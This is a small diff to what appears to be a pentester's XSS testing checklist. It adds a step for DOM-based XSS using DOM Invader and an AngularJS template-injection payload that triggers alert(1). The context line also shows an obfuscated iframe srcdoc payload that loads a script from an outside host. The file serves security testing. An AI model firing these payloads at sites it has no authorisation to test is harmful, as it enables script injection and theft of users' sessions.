@@ -18,4 +18,7 @@ link=qwe"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>
   ````
 
 - If no value are reflected in the response , then test for DOM based XSS. Open DOM Invador and enter the canary value in the search bar or anywhere in the query parameter.
-- 
+- See if the website is built with Angular js. Now see if the reflected payload is inside the  ng-app directive, use the below payload to trigger xss
+  ````
+  {{$eval.constructor('alert(1)')()}}
+  ````
